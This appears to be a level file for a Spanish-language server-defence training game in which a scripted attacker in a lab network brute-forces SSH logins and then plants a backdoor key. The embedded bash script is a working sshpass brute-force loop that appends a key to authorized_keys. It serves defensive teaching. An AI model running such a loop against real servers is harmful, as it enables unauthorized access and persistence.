// Nivel 1 · Asedio: un atacante real hace fuerza bruta contra tu sshd y planta una llave trasera.
import type { Juego } from './motor';

const S = 'servidor', A = 'atacante';
const IP_S = '10.8.1.1', IP_A = '10.8.1.2', IP_A2 = '10.8.66.6';
const DICC = { facil: 9, normal: 6, pesadilla: 3 }; // en qué intento acierta la contraseña

let fase = 0, limpio = 0, robado = 0, cambioIp = false;

const juego: Juego = {
  id: 'asedio',
  lab: 'j-asedio',
  titulo: 'Asedio',
  nivel: 'Examen final · Nivel 1 · Administración',
  resumen: 'Un atacante real contra tu sshd: contraseña débil, llave trasera y cambio de IP.',
  reglas: `<p>Eres el admin de <b>servidor</b>. Desde <b>atacante</b> (${IP_A}) alguien está probando contraseñas contra tu sshd. El usuario <code>becario</code> tiene una contraseña malísima.</p>
    <ul><li>«ic:castle» Mientras el atacante pueda entrar, te roba datos y pierdes vida.</li>
    <li>«ic:key-round» Cuando entra, deja una <b>llave trasera</b> en <code>~becario/.ssh/authorized_keys</code>.</li>
    <li>«ic:globe» Si le bloqueas la IP, <b>cambia de IP</b>.</li>
    <li>«ic:trophy» Ganas si aguantas <b>30 s seguidos</b> sin que pueda entrar por ningún sitio.</li></ul>
    <p>Pistas: <code>journalctl</code> no hay, pero sí <code>ss -tnp</code>, <code>last</code>, <code>passwd</code>, <code>usermod -L</code>, <code>iptables</code>.</p>`,
  mapa: { nodos: { servidor: { x: 260, y: 170, sub: IP_S }, atacante: { x: 660, y: 170, sub: IP_A } }, enlaces: [['servidor', 'atacante']], alto: 320 },
  terminales: [S],

  async iniciar(api) {
    const n = DICC[api.dificultad];
    const lista = ['123456', 'password', 'admin', 'qwerty', 'becario', 'letmein', '12345678', 'becario2024', 'iloveyou', 'abc123'];
    lista.splice(n - 1, 0, 'becario123');
    await api.exs([
      [S, `printf 'servidor · te están atacando. Usuario débil: becario\\n' > /etc/motd; ip route add 10.8.0.0/16 dev eth1 2>/dev/null; true`],
      [A, `rm -f /root/.ssh/malo*; ssh-keygen -q -t ed25519 -N '' -f /root/.ssh/malo; printf '%s\\n' ${lista.join(' ')} > /root/dicc.txt;
        cat > /usr/local/bin/atacar <<'EOF'
#!/bin/bash
# Fuerza bruta lenta y, si entra, deja una llave trasera.
while :; do
  for pw in $(cat /root/dicc.txt); do
    src=$(cat /run/ip-origen 2>/dev/null || echo ${IP_A})
    if timeout 4 sshpass -p "$pw" ssh -b $src -o PubkeyAuthentication=no becario@${IP_S} "mkdir -p ~/.ssh; grep -q malo ~/.ssh/authorized_keys 2>/dev/null || cat >> ~/.ssh/authorized_keys" < /root/.ssh/malo.pub 2>/dev/null; then
      echo "$pw" > /run/pw-buena
    fi
    sleep 1.5
  done
done
EOF
        chmod +x /usr/local/bin/atacar; nohup /usr/local/bin/atacar >/dev/null 2>&1 &`],
    ]);
    api.icono('yo', '«ic:shield»', S);
    api.icono('boss', '«ic:bug»', A);
    api.log(`«ic:bug» Desde <b>atacante</b> (${IP_A}) están probando contraseñas contra <code>becario</code>.`, 'boss');
  },

  async tick(api) {
    // Desde el atacante: ¿puede entrar por contraseña? ¿y por la llave trasera?
    const [r] = await api.exs([[A,
      `src=$(cat /run/ip-origen 2>/dev/null || echo ${IP_A}); pw=$(cat /run/pw-buena 2>/dev/null);
       [ -n "$pw" ] && timeout 3 sshpass -p "$pw" ssh -b $src -o PubkeyAuthentication=no becario@${IP_S} true 2>/dev/null && echo PASS;
       timeout 3 ssh -b $src -i /root/.ssh/malo -o BatchMode=yes -o PasswordAuthentication=no becario@${IP_S} true 2>/dev/null && echo LLAVE; true`]]);
    const pass = r.out.includes('PASS'), llave = r.out.includes('LLAVE');
    if (pass || llave) {
      if (fase === 0) { fase = 1; api.log('«ic:lock-open» ¡Ha entrado! Ha adivinado la contraseña de <code>becario</code> y está robando <code>/srv/datos</code>.', 'boss'); }
      robado++;
      api.danio(api.dificultad === 'facil' ? 2 : 4);
      limpio = 0;
    } else if (fase > 0) limpio++;
    api.chip('pass', pass ? '«ic:lock-open» contraseña débil' : '«ic:lock» contraseña', pass ? 'debuff' : 'buff');
    api.chip('llave', llave ? '«ic:key-round» llave trasera' : '«ic:brush» sin llave trasera', llave ? 'debuff' : 'buff');
    api.medidor('robo', '«ic:package» Robado', Math.min(100, robado * 2), 'var(--mal)', `${robado * 10} filas`);
    api.medidor('limpio', '«ic:shield» Seguro', (limpio / 30) * 100, 'var(--ok)', `${limpio}/30 s`);
    api.enlace(S, A, 'cortado', fase > 0 && !pass && !llave);
    api.claseNodo(A, 'mal', pass || llave);

    // Si le cortas sin cambiar la contraseña (p. ej. bloqueando su IP), cambia de IP.
    if (fase > 0 && !pass && !llave && !cambioIp && limpio >= 5) {
      const [c] = await api.exs([[A, `pw=$(cat /run/pw-buena); timeout 3 sshpass -p "$pw" ssh -b ${IP_A} -o PubkeyAuthentication=no -o ConnectTimeout=2 becario@${IP_S} true 2>/dev/null && echo SIGUE`]]);
      // Solo si la contraseña sigue valiendo (lo bloquearon por IP): se mueve a otra IP.
      const [p] = await api.exs([[S, `grep -c '^becario:[!*]' /etc/shadow; true`]]);
      if (!c.out.includes('SIGUE') && p.out.trim() === '0') {
        cambioIp = true;
        limpio = 0;
        await api.ex(A, `ip addr add ${IP_A2}/16 dev eth1 2>/dev/null; echo ${IP_A2} > /run/ip-origen`);
        api.etiquetaNodo(A, IP_A2);
        api.log(`«ic:globe» Le has bloqueado la IP… y se ha cambiado a <b>${IP_A2}</b>. Bloquear IPs no basta: arregla la cuenta.`, 'boss');
      }
    }
    if (fase > 0 && limpio >= 30) {
      api.puntos(500 - robado * 5 + api.vida * 3);
      api.fin(true, `<p>Asedio resistido. El atacante se llevó ${robado * 10} filas antes de que cerraras todas las puertas.</p>`);
    }
  },
};
export default juego;
